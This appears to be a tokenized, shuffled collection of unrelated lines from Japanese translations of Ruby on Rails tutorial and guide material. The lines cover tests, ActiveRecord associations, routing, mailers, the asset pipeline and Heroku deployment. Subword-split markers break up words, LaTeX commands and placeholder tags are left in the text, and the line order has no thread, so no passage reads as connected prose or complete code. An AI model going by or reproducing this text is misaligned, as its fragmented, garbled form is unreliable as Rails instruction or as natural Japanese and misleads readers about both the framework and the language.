▁ユーザーの id は \ k ode { params [: id ]} 変数 で 取り出す ことができる の を 思い 出 してください ▟ つまり 、 リスト \ ref { code : initial _ edit _ action } のコード を使えば そのユーザー を 指定 できる ということです 。
▁Bitbucket アカウント が ない場合は \ href { https :// bitbucket ▖ org / account / signup /}{ アカウント を作成します } 。
▁\ k ode { save } メソッドは 、 成功 すれば \ k ode { true } を 、 失敗 すれば \ k ode { false } を返します
▁` invalid ?` は単なる ` valid ?` の 逆 の動作 です 。
▁# ▁=> ▁ { 1 =>1 , ▁nil => nil , ▁: a =>" a "}
▁ レイアウト にある すべての リンク に対して 統合テスト を書いて みましょう ▟ ログイン 済み ユーザー と そうでない ユーザーの それぞれ に対して 、 正しい 振る舞い を 考え てください 。
▁( この 間違った 用 語 について 指 摘 してくれ た Andy ▁P hi l ips に 感 謝 します ▟)
▁before _ save ▁: before _ save _ callback ▁# ▁ 良い
▁Twitter のような 「 フォロワー ▁( following ) 機能 」 や 「 フォロー 中 ▁( followed ) 機能 」 がない
▁` root ` で 始 ま っている 行 を見つけ 、 コメント 記 号 を 外 してください 。
▁ここで 静的なページ を 作る ために 採 用 した 方法は 、 おそらく 最も シンプルな 方法 です ▟ ただし 他にも 方法は あります 。
▁### ▁`: allow _ nil `
▁server ▖ start
▁</ span >
▁これで 静的ページ への ルート がすべて 動作 し 、 テスト も すべて パスするはずです 。
▁ それぞれ のメリット と デ メ リ ッ ト は 以下の とおり です 。
▁ 失敗する テスト を確認する ために 検証 を コメントアウト する 。
▁{0} 図 7 ▖ 1 3 {/0} ▁{1} \ k ode { text } フィールド と \ k ode { password } フィールド に 文字 を 入力 した 状態 {/1}
▁このメソッドは 内部で ` content _ tag _ for ` を呼び出し て `: div ` を タグ 名 に してくれる 、 便利な メソッドです 。
▁* ▁` active _ record ▖ initialize _ time zone `: ▁` ActiveRecord :: Base ▖ time _ zone _ aware _ attributes ` を true に設定し 、` ActiveRecord :: Base ▖ default _ time zone ` を UT C に設定し ます 。
▁# ▁Buil d ▁JSON ▁API s ▁with ▁ ea se ▖
▁Action ▁View について
▁User Mailer を例にとって 説明します ▟ ` app / views / user _ mailer ` ディレクトリに ` welcome _ email ▖ text ▖ erb ` と ` welcome _ email ▖ html ▖ erb ` という テンプレート があると 、 Action ▁Mailer は それぞれの テンプレート から HTML メール と テキスト メール を生成し 、 マルチ パ ート 形式 の メール として ひとつ に まとめて 自動的に 送信 します 。
▁### ▁Action ▁Controller を設定する
▁$ ▁rails ▁server
▁" table "▖ pluralize ▁# ▁=> ▁" table s "
▁次に 、 ▁リスト \ ref { code : test _ helper _ log _ in } で定義した \ k ode { log \_ in \_ as } メソッドを使って 、\ k ode { edit } アクションと \ k ode { update } アクション をテストします ▁( リスト \ ref { code : edit _ update _ wrong _ user _ tests }) 。
▁最後に 、\ k ode { alt } 属性 は 、 画像 がない場合 に 代わりに 表示される 文字列 です ▟ たとえば 視 覚 障 害 のある ユーザーが 使用する ス ク リ ー ン リ ー ダ ー では 、 ここ の 属性 が 読み 上 げ ら れ て 、 そこに 画像 がある ことが 示 されます 。
▁</ h 1>
▁` find ` メソッドで マッチする レコードが 見つからない 場合 、` ActiveRecord :: RecordNotFound ` 例外が発生します 。
▁# ▁=> ▁( 123 ) ▁ 555-1234
▁ これを行なうには 、 従来 の 相 対 パス に代えて CDN を アセット の ホスト サーバー と するよう Rails を設定します 。
▁変更の結果 を リスト \ ref { code : create _ js _ erb } に示します 。
▁これにより 、 任意の ユーザーが 自分自身 に アプリケーションの 管理者 権限 を与える ことを 防止 できます 。
▁We ▁first ▁invoke ▁the ▁console ▁with ▁\ k ode { rails ▁console } ▁at ▁the ▁command ▁line , ▁and ▁then ▁retrieve ▁the ▁first ▁user ▁from ▁the ▁database ▁using ▁\ k ode { User ▖ first } ▁( putting ▁the ▁results ▁in ▁the ▁variable ▁\ k ode { first _ user })
▁ 推 奨 環境 である クラウド IDE ▁(\ ref { sec : development _ environment }) ▁ に はデフォルトで Git が 導 入 されています ので 、 追加 で 導 入 する必要はありません 。
▁ データベース 上に データ を追加する のは 遅 く なり が ち で 、 システムによっては 数 分 か か ること も あり 得 ます 。
▁次の 章では 、 この {0} 第 {1} 1 {/1} 章 {/0} で学んだ ことを 基 礎 として 、 データベース を備えた \ emph { toy アプリ } を 製 作 し 、 Rails で どんな ことができる か を さらに 詳 しく 学びます 。
▁第 \ ref { cha : a _ toy _ app } 章では 、 Rails アプリケーションの 基本的な 仕 組み を 体 験 するために 、 別の プロジェクト を作成します 。
▁ユーザー 自体 が 破棄され たときに 、 そのユーザー に依存する マイクロポスト ▁( つまり 特定の ユーザーの もの ) ▁ も 破棄され ること を指定して います 。
▁* ▁` update _ column `
▁respond _ to ▁do ▁| format |
▁# ▁ メッセージ の 連 鎖
▁NOTE : ▁この マッチ ャ ▁( および 後 述 する プリコンパイル 配列 の 他の メンバ ) ▁ が 適用 される のは 、 コンパイル 前 や コンパイル 中の ファイル名 ではなく 、 コンパイル 後 の 最終的な ファイル名 である 点にご注意ください 。
▁* ▁ アプリケーションの アセットを 正しく 編 成 する方法
▁ Asset ▁Pipeline の 最大 のメリット の 1 つ は 、 本番 の アプリケーションで 効率 的 になるように 最適化 された アセット も 自動的に 生成される ことです 。
▁ 単 なる Ruby の コードを書く のであれば 、 モジュール を作成する たびに 明示的に インクルード して 使用する のが普通です が 、 Rails では 自動的に ヘルパー モジュール を インクルード してくれる ので 、 include 行 を わざわざ 書く 必要がありません 。
▁ エンジン を使う うちに 、 その中で イニシャライザ や 国 際 化 などの 機能 オプション を使用した くなる ことでしょう 。
▁( 実 を 言 う と 、 この \ href { http :// railstutorial ▖ org } { Ruby ▁on ▁Rails チュートリアル Web サイト } も Heroku 上 に置かれ ています ▟ 本チュートリアル を オンライン で 読んで い る のであれば 、 まさに Heroku に ホスティング された Web サイト を見 ている という ことになります ) 。
▁` / articles / new ` という ルーティング は 、 この フォーム を 最初に 表示 するときに 使用される もの なので 、 記 入 された フォームの 送信 先 まで 同じ ルーティング に してしまう のは 変 です ▟ ` / articles / new ` は フォームの 表示 専 用に すべき です 。
▁` File ` の拡張
▁\ emph { 期待どおり } の 条件 となります ▟ そして 条件 が 満 た される と リスト \ ref { code : user _ model _ password _ reset _ expired } の \ k ode { password \_ reset \_ expired ?} メソッドが 実行されます
▁### ▁ バ イ ト
▁このメソッド には 、 キャッシュ したい コンテンツ を 1 つの ブロック に含め て 引数として 渡します 。
▁ 利用 可能な 数 よりも 多くの 接続 を使用 しようとすると 、 Active ▁Record は 接続 を ブロック し 、 プール からの 接続 を 待 ち ます 。
▁ 表 \ ref { table : static _ pages } の各 タイトル について 簡単な テストを 書き ます ▁( リスト \ ref { code : about _ test })▟ この テストで 使用している \ k ode { assert \_ select } メソッドでは 、 特定の HTML タグ が存在する かどうか をテストします ▁( この種の アサーション メソッドは その 名 から 「 セ レ ク タ 」 と呼ばれる こともあります )
▁ ビュー は 、( Apache や N g in x などの Web サーバー を経由して は い る が ) ▁ ブラウザに HTML を直接 返す と 説明 している 文 献 もあります 。
▁person ▖ errors [: name ] ▁# ▁=> ▁[]
▁\ emph { Ruby ▁on ▁Rails ▁ チュートリアル } は 、 私 の 以前の 著 書 「\ emph { RailsSpace }」 と 、 その 時の 共 著者 の ▁\ href { http :// a ure ▖ com /}{ A ure li us ▁ Pro cha z k a } ▁ から 多くの こと を参考に させ ても ら っています 。
▁ フォームを送信すると 、 フォーム に含まれる フィールド は ▁ _ パラメータ _ ▁ として Rails に 送信されます 。
▁ Admin ? ▁: ▁<%= ▁ permission _ field s ▖ check _ box ▁: admin ▁%>
▁ コマンド
▁この ミドルウェア は 、` config ▖ cache _ classes ` が ` false ` に設定され ている 場合 のみ 有効 になります 。
▁ リダイレクト では \ k ode { user _ url } を省略 し 、 単 に \ k ode { redirect _ to ▁@ user } と 書 け ば ユーザー表示ページ に移動し ます 。
▁Active ▁Support には 配列 の API が 多数 追加 されており 、 配列 に 容易に アクセス できる ようになっています 。
▁ ファイルの 中 身 をすべて 削除 し 、 以下の 1 行 に置き換え てください 。
▁ 以下のような Rails のデフォルト 情報 ページ が表示されます 。
▁ ログインフォーム
▁<%= ▁stylesheet _ link _ tag ▁" blorgh / style ▖ css " ▁%>
▁` author ` オブジェクト と ` User ` クラスの 関連付けを 示す ことにより 、 エンジン と アプリケーションの 間 に リンク が 確 立 されます 。
▁次に データベースをリセットし 、 サンプルデータを 再度 生成 します 。
▁<%= ▁render ▁" shared / ad _ banner " ▁%>
▁このメソッドは 単 独 で 使用できます ▟ ` valid ?` を実行すると バリデーション が トリガ され 、 オブジェクト に エラー が ない場合は true が返され 、 そう で なければ false が返されます 。
▁上のコードによって以下 が生成されます 。
▁has _ many ▁: s ub or d in ate s , ▁class _ name : ▁" Employee ",
▁$ ▁rails ▁console ╼ ▁> > ▁1▖ year ▖ from _ now ╼ ▁=> ▁Sun , ▁09 ▁A ug ▁20 15 ▁ 16 : 48 : 17 ▁UTC ▁+00:00 ╼ ▁> > ▁10 ▖ weeks ▖ ago ╼ ▁=> ▁S at , ▁31 ▁May ▁2014 ▁ 16 : 48 : 45 ▁UTC ▁+00:00
▁1 つ目は ` find _ each ` メソッド を使用する 方法 です ▟ これは 、 レコード の バッチ を 1 つ 取り出し 、 次に ▁ _ 各 _ ▁ レコードを 1 つの モデル として 個 別 に ブロック に yield します 。
▁last ` メソッドは 、 モデルに レコードが 1 つ も ない場合 に ` nil ` を返します ▟ このとき 例外 は 発生 しません 。
▁def ▁before _ save _ callback
▁({0}{1} 第 8 章 {/1}{/0} で 本 格 的に 実装します ) 。
▁その 背 後 では 、 そのオブジェクト から 主キー を取り出し 、 関連付け る オブジェクトの 外部キー の 値を その 主キー と同じ 値 に します 。
▁* ▁Rails で 皆 が 使用している 慣例 や ヘルパーメソッド を使用すること 。
▁このヘルパーは 、1 つの ブロック に対して 属性 を検証します 。
▁* ▁[ Rack ▁API ▁ ド キ ュ メ ン テ ー ション ]( http :// rack ▖ github ▖ io / )
▁ 得 られた 文字列 に対して ` constantize ` ▁( 後 述 ) ▁ を実行する ことで 本 当 の クラス オブジェクトを 得られます 。
▁以下の スタイル で 書くこと 。
▁これは 、\ k ode { a } と \ k ode { b } が 同じ 配列 を 指 している ためです
▁def ▁find _ by _ order _ prefix ( order _ number )
▁ 記事 に コメント が追加された ところ ]( images / getting _ started / article _ with _ comments ▖ png )
▁ 一部の 設定 については 、 Rails の 外部 から 環境変数 を与える ことで 行なう こともできます 。
▁` collection ▖ build ` メソッドは 、 関連付け が 行われた オブジェクトを 1 つ 返します 。
▁これ に代えて 、 以下のように \ k ode { sequence } メソッドを使用して 一連の 名前とメールアドレス を列挙し ます 。
▁errors ▖ add (: expiration _ date , ▁" : ▁ 過 去 の 日付 は 使用できません ")
▁layout ▁: products _ layout
▁create ▁app / assets / javascripts / microposts ▖ js ▖ coffee
▁ これはリスト \ ref { code : utility _ method _ tests } で使用されていました 。
▁| ▁| ▁20 2 ▁| ▁: accept ed ▁|
▁#### ▁JSON を出力する
▁Ruby ▁on ▁Rails ▁3▖2 ▁ チュートリアル
▁WARNING : ▁`: prefix ` オプション が ` true ` の場合 、 一 般 性 が 低 下 します ▁( 後 述 ) 。
▁このヘルパーは 、 属性 に 数値 のみ が使用され ていること を検証します 。
▁( 現 状 では 、 保存 はすべて 成功 するはずです ▟ 失敗する 場合 については \ ref { sec : user _ validations } で説明します ) 。
▁` order ` メソッドは 、 関連付けられたオブジェクト に 与 え られる 順序 を指定します ▟ 内部 的に は SQL の ` O R DER ▁BY ` 句 が使用されます 。
▁# ▁ 永続的セッション を破棄する
▁ 「 地 球滅亡 クラス 」 の 重大な 問題 でも ない限り 、 レポート しても ら った issue は 他の issue と同様に 、 解決 に 向 け て 共 同 作業 が 行われ る ようになります 。
▁{0} 図 10 ▖2{/0} {1} micropost ▁ と ▁user {/1} 間 の \ k ode { belongs _ to } リレーションシップ
▁ これはリスト \ ref { code : correct _ signin _ failure _ test } で使用されていました 。
▁ 既存の コミット そのもの を修正する ことを 求 め られる こともあります 。
▁ コントローラ の場合と同様 、 メイラー の メソッド 内で 定義された すべての インスタンス変数 は そのまま ビューで 使用できます 。
▁* ▁` lib / assets ` は 、1 つの アプリケーションの 範 疇 に 収 ま らない ライブラリ のコード や 、 複数の アプリケーションで 共有 される ライブラリ の コードを 置く 場所 です 。
▁上の 操作 で デプロイ と マイグレーション を行う と 、 その 間 に 標準 の エラー ページ が出力されます
▁image _ url (" edit ▖ png ") ▁# ▁=> ▁ http :// www ▖ example ▖ com / assets / edit ▖ png
▁ 記 憶 ブランチ をテストする
▁#### ▁JRuby プラットフォーム で PostgreSQL データベース を使用する
▁これは 、` Model ▖ find ` 呼び出し で ` includes ` を指定する ことで 実現 できます 。
▁* ▁FROM ▁" users " ▁WHERE ▁" users "▖" state " ▁= ▁' active ' ▁ AND ▁" users "▖" state " ▁= ▁' inactive '
▁array ▁# ▁=> ▁[ ' foo ']
▁has _ one ▁: account , ▁class _ name : ▁" Billing ", ▁ dependent : ▁: nullify
▁` Article # time _ since _ created ` を ** 追加する ** 場合 :
▁( 今は こ のうち の 1 つ しか 使い ません が 、 あ と で 他の マイクロポスト も 利用 していきます ▟)
▁\ ref { sec : hello _ world } と \ ref { sec : mvc _ in _ action } で や った ように 、 ルーティング を設定する には \ k ode { routes ▖ rb } ファイルを 編集 して 、 ルート 「 / 」 と Web ページを 結 び 付け ます ▟ 結 び 付ける 相手 は Home ページ です
▁before フィルター は 基本的に アクション ごとに 適用 して い く ので 、 Users コントローラの テスト も アクション ごとに 書いていきます ▟ 具体的には 、 正しい 種類の HTTP リクエスト を使って \ k ode { edit } アクションと \ k ode { update } アクション をそれぞれ 実行 させ て み て 、 flash に メッセージ が 代入 された かどうか 、 ログイン 画面 に リダイレクト された かどうかを確認 してみましょう 。
▁mail ( to : ▁email _ with _ name , ▁subject : ▁' Welcome ▁to ▁My ▁A wesome ▁ Site ')
▁signup ページ への テストは 演習 に 回 す ことにします ▁(\ ref { sec : exercises _ rails _ routes }) 。
▁<%= ▁user _ url (@ user , ▁host : ▁' example ▖ com ') ▁%>
▁ 冗 長 性 の 原 因 は 他にも あります 。
▁To ▁get ▁help ▁on ▁this ▁sample ▁app , ▁see ▁the
▁もちろん 、 この オブジェクトは 何らかの 形で 参 照 可能な 識 別 子 ▁( id ) ▁ を持つ 必要があります 。
▁@ users ▁= ▁User ▖ all
▁ 生成された テスト を見てみましょう ▁( リスト \ ref { code : default _ controller _ test }) 。
▁render ▁template : ▁" books / edit "
▁* ▁FROM ▁` users ` ▁WHERE ▁` users ` ▖ ` id ` ▁= ▁1
▁( パス したときに も 色 を表示できるように するには 、\ ref { sec : minitest _ reporters } の minitest レ ポ ー ター を オプションで 追加 する必要があります ) 。
▁この 機能を 実現 するには 、 Rails と Ruby の 高度な 機能 の他に 、 SQL プログラミング の 技術 も 必要です 。
▁redirect _ to (@ book )
▁ とは 言 う もの の 、 最初の 部分 は それ なり に 異なります ▟ アカウントの有効化 と異なり 、 パスワードを 再設定 する 場合は ビューを 1 つ 変更 する必要が あり 、 新しい フォーム も 2 つ ▁( メール レイアウト 用 と 新しい パスワード の 送信 用 ) ▁ 必要です 。
▁` extending ` メソッドは 、 関連付け プロキシ を 拡張 する 名前付き モジュール を指定します 。
▁* ▁` config ▖ action _ mailer ▖ interceptor s ` は 、 メールを送信 する 前に 呼び出す イン ター セ プ タ を 登録 します 。
▁2 ▁rows ▁in ▁set ▁(0▖00 ▁ sec )
▁もし XSS で 汚染 された 文字列 が 戻り値 に含まれている と 、 ブラウザで 表示され たときに 悪意のある コードが 実行 されてしまいます 。
▁< b > Z one ▁name </ b >< br >
▁\ k ode { header } タグ は 、 ページの ト ッ プ に 来 る べ き 要素を 表 します 。
▁ 皆さん の ご 推 察 どおり 、 実は \ k ode { nil } かどうか を調べる メソッド もあります 。
▁たとえば 、 以下のような ビュー が あるとします 。
▁しかし 、 自動生成 された コードは 無 駄 に 量 が 多く 複 雑 で 、 Rails 初心者 には 向 いて いません ▟ たとえ 運 よく 動 いた としても 、 正常に 動いている 理由 を 解 明 するのは おそらく 無 理 です 。
▁\ k ode { flash ▖ now } メソッドを使用すると 、 レンダリング 済み の ページに も フラッシュメッセージ を 表示 できます 。
▁* ▁` config ▖ action _ controller ▖ default _ cha r set ` は 、 すべての 画面 出力 で使用される デフォルトの 文字 セット を指定します 。
▁ ユーザーが パスワードの再設定 を リクエスト すると 、 ユーザーが 送信 した メールアドレスを キー に して データベースから ユーザー を見つけ る 。
▁ s ▖ add _ dependency ▁" m oo "
▁ テストスイート を実行して 、 リスト \ ref { code : token _ digest _ self } ▁( や や わかりにくい ) ▁ や ▁リスト \ ref { code : token _ digest _ class _ self } ▁( 非常に 混 乱 する ) ▁ の実装 が 正しい ことを確認してください ▟ これが 問題 です
▁adapter : ▁ j db c postgresql
▁" bar " ▁: ▁" baz "
▁a 2 ▁= ▁A ▖ new
▁# ▁: uglifier ▁config ▖ assets ▖ css _ compressor ▁= ▁: yui
▁ 実は 、\ k ode { assigns } という 特殊な テスト メソッドを使用すると アクセス できるようになります 。
▁<%= ▁comment ▖ comment er ▁%>
▁def ▁# { severity ▖ downcase } ?
▁ 以後 この章 を進める に あたり 、 有 用 な リソース である \ href { http :// ruby - doc ▖ org /}{ Ruby ▁API } を参照 しながら 学習 すること を ぜ ひ お勧め します ▟ Ruby ▁API には 高 濃 縮 の 情報 が 詰 ま っています ▁( 少々 \ emph { 濃厚 すぎる } とも 言えます )▟ たとえば 、 Ruby の 文字列 の詳細 を知り たい場合は 、 Ruby ▁API エントリ の \ k ode { String } クラス を参照 すればよいのです 。
▁リスト \ ref { code : login _ upon _ signup } の動作 をテストするために 、 リスト \ ref { code : a _ test _ for _ valid _ submission } のテスト に 1 行 追加 して 、 ユーザーがログイン 中 かどうかをチェックします 。
▁#### ▁JavaScript / CoffeeScript と ERB
▁また 、 画像 の 無 い ▁( テキスト のみ の ) ▁ マイクロポスト では 画像 を 表示 させ ないようにする ために 、\ k ode { picture ?} という 論理値 を返す メソッドを 使 っ ている点に注目してください 。
▁ 当 然 の ことです が 、 サインイン を要求する だけで は 十分 ではありません ▟ ユーザーが \ emph { 自分自身 の } 情報 以外の 他 ユーザーの 情報を 編集 でき ないようにする 必要もあります 。
▁ 無名 モジュール ( anonymous ▁module ) を使用して これらの オブジェクトを 拡張 ( 検索 、 作成 などの メソッドを 追加 ) することができます 。
▁NOTE : ▁ 通常の フォーム では そのため の 隠 し フィールド が生成され るので 、 これらの タグ は 使用 されません 。
▁< a ▁ href ="# " ▁on click =" paintIt ( this , ▁' # 0 000 99 ', ▁' # FFFFFF ') "> P aint ▁it ▁b l ue </ a >
▁その 際に は なるべく ` config / environments ` にある 既存の ファイルを 流 用 し 、 必要な 部分 のみ を変更 するようにしてください 。
▁A ge : ▁ 88 58 14
▁Web ブラウザは 実際には \ text tt { DELETE } リクエストを 発 行 できない ので 、 Rails では JavaScript を使用して この リクエストを 「 偽 造 」 します 。
▁\ k ode { authenticated ?} を追加する
▁Rails ▁4▖1 では 、 各 フィクスチャ の ERB は 独立した コンテキスト で 評価 されます ▟ このため 、 ある フィクスチャ で 定義された ヘルパーメソッド は 他の フィクスチャ では 利用 できません 。
▁@ article ▁= ▁Article ▖ new ( article _ params )
▁has _ one ▁: guest
▁ 置き換え の 終 わ った 正しい アプリケーション コードをリスト \ ref { code : correct _ signin _ failure } に示します 。
▁`: type ` オプションで : builder を指定すると 、 ERB に代えて Builder が使用されます 。
▁ ================ ================
▁ パ ズ ル も いよいよ 最後の ピ ー ス を 残 す だけ となり ました ▟ 渡された トークン が ユーザーの 記憶ダイジェスト と 一致する ことを確認します ▟ この 一 致 を bcrypt で 確 認 するための 様々な 方法があります 。
▁ 以上の 準備 が 終 わ れば 、 以下の コマンドで \ k ode { guard } を 起動 できます 。
▁\ k ode { if } - \ k ode { else } 分 岐 を使用して コードを 書き 分 け ている 点が 少し 汚 い ですが 、 このコード の ク リ ー ン アップ は 演習 に 回 す ことにします ▁(\ ref { sec : exercises _ creating _ microposts }) 。
▁\ k ode { from _ users _ followed _ by } の 最終的な 実装 。
▁` form _ for ` メソッドを呼び出す ときには 、 この フォーム を 識 別 するための オブジェクトを 渡 してください 。
▁ そのために は 、` app / controllers / articles _ controller ▖ rb ` の ` new ` アクション ` と ` create ` アクション を以下のように変更し てください 。
▁User ▖ where ( week ly _ s ub s c ri b er : ▁true )▖ find _ each ▁do ▁| user |
▁さらに 、 上の ように \ k ode { params } ハッシュ を まるごと 渡す と エラー が発生する ので 、 Rails はデフォルトで マスアサインメント の 脆弱性 から 守 られる ようになりました 。
▁( テキスト に対するテスト は 壊 れ やすい です ▟ 文 量 の 少 ない flash の キー であっても 、 それ は 同じです ▟ 個 人 的に は 、 flash が 空 でない か をテストする だけ の場合 が多い です )
▁ { nil ▁=> ▁nil , ▁1 ▁=> ▁1, ▁" nested " ▁=> ▁{" a " ▁=> ▁3 , ▁5 ▁=> ▁ 5}} ▖ deep _ symbolize _ keys
▁もちろん 、 この 継 承 の 知識 は 、\ k ode { ActiveRecord :: Base } に含まれる メソッド など について 知 ら なければ 何 の 役 にも 立 ち ません ▟ それらの 知識 の一部 について これ から 説明します 。
▁The ▁\ k ode { current _ user ?}
▁` ActiveRecord :: Base # to _ param ` は モデルの ` id ` を返します が 、 この メソッドを モデル 内で 再 定義 することもできます 。
▁% w ( a ▁b ▁c ▁d )▖ th ir d ▁# ▁=> ▁c
▁以下の例 は ` ActionDispatch :: Http :: Cache :: Response ` から 引 用 しました 。
▁上の コマンドで は 、 指定した テスト ファイル 内にある 特定の テスト だけ を実行する ために 、 以下の オプション を追加して あります 。
▁WARNING : ▁上の 正規表現 では 末尾に 改行 記 号 が あって も マッチ します 。
▁### ▁` atomic _ write `
▁group (" date ( created _ at ) ")▖ having (" sum ( price ) ▁> ▁? ", ▁100 )
▁ doc rails は 、 コーディング から 独立した ド キ ュ メ ン テ ー ション のみ を 目的 と しています 。
▁(\ k ode { eq } は 同 値 性 をテストする RSpec の メソッドです ) 。
▁if ▁options [: field s ] ▖ any ? {
▁これで find の場合 のテスト を 実 施 できます ▟)
▁has _ many ▁: ads
▁ ice ? ╼ %= ▁< span ▁class =' exercise ' ▁id =' ex - d 0 b b fe ' ></ span >╼ \ end { enumerate }╼╼ ▁% ▁subsection ▁using _ form _ for ▁( end )╼╼ ▁\ subsection { フォーム HTML } ▁% ▁( fold )╼ ▁\ label { sec : the _ form _ html }╼╼
▁* ▁` auto b uffer : ▁true ` は 、 ページ 読み込み 時に すぐ 再 生 できるように ビデオ を事前に 読み 込 んで お きます 。
▁| ▁GET ▁| ▁ / sekret / comments / : id (▖ : format ) ▁| ▁comments # show ▁| ▁comment _ path ▁|
▁ 与えられた 文字列を ` constantize ` メソッドで 評価 しても 既 知 の 定数 と マッチ しない 、 または 指定された 定数名 が正しく ない場合は ` NameError ` が発生し ます 。
▁ そして 、 edit ページ を表示し ても \ k ode { edit } アクション の 認可 テストは できます が 、\ k ode { update } アクション の 認可 テストは できません 。
▁ 関連付けられた ユーザー を通して マイクロポスト にアクセス する ので 、\ k ode { create } アクション や \ k ode { destroy } アクション を利用する ユーザーは 、 ログイン 済み で なければなりません 。
▁ そんな ときには デフォルトの 命 名 ルール を簡単に オーバーライド できます 。
▁ strip _ tags (" < b > Bo ld </ b > ▁no ▁more !
▁ 非常に 単純な ページ では あります が 、 静的なページ を 自分の 手 で 作成 することは 良い 経験 になり 、 多くの 示 唆 も 得られます ▟ 私 達 が これ から 開発 する アプリケーション にとって 最適な ス ター ト 地 点 と い え る でしょう 。
▁create ▁app / controllers / users _ controller ▖ rb
▁#### ▁CDN で 静 的な アセットを 提供する
▁ 体 制 が 整 った ので 、 早速 コードを 追加 ・ 編集 しましょう 。
▁ リソース ベースの ルーティング : ▁Rails のデフォルト
▁Ruby の 文字列 は 、 以下のように \ k ode { empty ?} メソッド にも 応答 することができます 。
▁リスト \ ref { code : bootstrap _ css } の 2 行 では 、 Bootstrap ▁CSS の フレームワーク を導入し ています 。
▁ 組み込み ヘルパー
▁\ k ode { gravatar \_ for } ヘルパーメソッド を定義する
▁{0} 図 11 ▖2{/0} {1} フォローする 相手 を見つけ る ▟\ href { http :// railstutorial ▖ org / images / figures / page _ flow _ user _ index _ mockup _ bootstrap - full ▖ png }{( 拡大 ) }{/1}
▁リスト \ ref { code : users _ migration } の マ イ グ レ ー テ ョ ン によって 作成された 完全な データモデル を 図 \ ref { fig : user _ model _ initial } に示します
▁ マイクロポスト 投 稿 フォーム に 画像 アップ ロー ダ ー を追加する
▁ 読む に 値 する Rails 関連の 書 籍 や ドキュメント は 書 店 や Web で い く ら でも 見つけ られます ▟ 正 直 、 あまり の 多 さ に 閉 口 する ほど です 。
▁デフォルトでは 、 Sprockets が 使用する パブリックな パス は ` / assets ` になります 。
▁また 、\ k ode { has _ secure _ password } を使って パスワードを ハッシュ化 するためには 、 最 先 端 の ハッシュ 関数 である \ href { http :// en ▖ w ikipedia ▖ org / wiki / B crypt } { bcrypt } が必要 になります 。
▁ Sign ▁in
▁ 新しい データモデル で データベース を更新する には 、\ ref { sec : demo _ users _ resource } のときと同様に マイグレーション を実行します 。
▁( 上 記 の 2 行目 にある ▁' > ' ▁ という文字 は 、 改行 を 示す ために シェル が自動的に 挿入する 文字 です ▟ 手動で 入力 しないよう 、 注意してください ) ▁\ k ode { admin } ▁ 属性 ▁( リスト \ ref { code : admin _ migration }) ▁ の 時 と同様に 、\ k ode { activated } 属性 のデフォルトの 論理値 を \ k ode { false } に します ▁( リスト \ ref { code : add _ activation _ to _ users _ migration }) 。
▁now ▖ all _ week
▁これ を行わ ない と 、「 な ぜ か テストが と お らない ▖▖▖ or z 」 ということ になり か ね ません 。
▁次に 、 対応する パーシャル を リスト \ ref { code : micropost _ partial } に示します 。
▁( 上 記 の 2 行目 にある ▁' > ' ▁ という文字 は 、 改行 を 示す ために シェル が自動的に 挿入する 文字 です ▟ 手動で 入力 しないよう 、 注意してください ▟) ▁上の オプションは 、 テスト 名 を指定する ときに 使う オプション です ▟ なお 、 指定 する テスト 名 は 、 接 頭 語 の 「 test _ 」 と 、 テストの 説明 文 の 単語 を アンダースコア で つ ない だ 文字列 で 表 します 。
▁ 以下のように 、 数値 の 桁 区切り を追加して 文字列 形式 に できます 。
▁ それ は 、 図 \ ref { fig : heroku _ sample _ users } が 示す ように 、 サンプルユーザー の表示 順序 が 変 化 し てしまい 、 図 \ ref { fig : user _ index _ pagination } にある ような ローカル 環境で の表示 順序 と 異 な っ てしまう ことです ▟ これは 現時点では まだ デフォルトの 表示 順序 が指定されてい ないこと が原因で す ▟ ▁ 結果 として 、 データベース の内容 に応じて 表示 順序 が 異 なってしまい ます 。
▁{0} 図 10 ▖7{/0}{1} ユーザープロファイル ▁(\ href { http :// localhost :3000/ users /1}{/ users /1 }) ▁ と マイクロポスト ▟\ href { http :// railstutorial ▖ org / images / figures / user _ profile _ with _ microposts _ bootstrap - full ▖ png }{( 拡大 ) }{/1}
▁invoke ▁ jbuilder
▁ データ が アプリケーションの 他の 部分 によって 更新 されている 可能性 に対応する ために 、 キャッシュ を再読み込みする には どう したら よいでしょう か 。
▁ private
▁ここでは デフォルトの ページを 差し替え たい ので 、\ emph { ルート のルーティング } ▁(\ emph { ルート ▁URL } にアクセス した 場合 のルーティング ) ▁ を変更する ことにします 。
▁その 際 、 データベースに サンプルデータを 追加 する方法 や 、 将来 ユーザー 数 が 膨 大 になって も index ページを 問題 なく 表示 できるように するための ユーザー 出力 の \ emph { ページネーション ▁( pagination = ページ 分割 )} ▁ の 方法を 学びます 。
▁ リポジトリ を作成し たら 、 以下を実行して アプリケーションを プッシュ します 。
▁`: source _ type ` オプションは 、 ポリモーフィック関連付け を 介 して 行われ る ` has _ many ▁: through ` 関連付け における 「 ソース の 」 関連付け タイプ 、 つまり 関連付け 元の タイプ を指定します 。
▁assemblies ▖ create !( attributes ▁= ▁{}) `
▁use ▁Rack :: Head
▁` belongs _ to ` 関連付けを 宣言 した クラス では 、 以下の 5 つの メソッドを 自動的に 利用 できるようになります 。
▁( Not ▁ Y e t ▁Implement ed )
▁リスト \ ref { code : account _ activation _ view _ text } や リスト \ ref { code : account _ activation _ view _ html } で定義した テンプレート の 実際の 表示 を簡単に 確 認 するために 、\ emph { メール プレビュー } という 裏 技 を使って みましょう ▟ Rails では 、 特殊な URL にアクセスすると メールの メッセージ を その 場 で プレビュー することができます ▟ メールを 実際に 送信 し なくても よい ので 大 変 便利です 。
▁ただし 、1 つ 重要な 違い があります ▟ Ruby は シングルクォート 文字列 の中で は 式 展開 を 行 いません 。
▁<%= ▁f ▖ text _ field ▁: name ▁%>
▁ atom _ feed ▁do ▁| feed |
▁ テスト 環境で \ k ode { full _ title } ヘルパー を使う ▁( {3} { 4 } {/4} { 4 } { 5 } green { /5}{/ 4 } { 4 } {/4} {/3}
▁ 返される 値は 、 その フィールド の 平 均 値 です ▟ 通常 3▖1 4 15 92 6 5 のような 浮 動 小 数 点 になります 。
▁\ href { http :// localhost :3000/ microposts / new }{/ microposts / new } ページ をブラウザで開き 、 新しいマイクロポスト の 情報を 入力 して マイクロポスト をいくつか 作成 してみましょう ▁({1}{2} 図 2▖1 2 {/2}{/1} ) 。
▁# ▁< author ed - timestamp ▁type =" datetime "> 200 9 - 0 9 - 02 T 16 : 44 : 36 Z </ author ed - timestamp >
▁ 著者 の システム 上で は 、 以下の URL を ブラウザで 開 く と 、
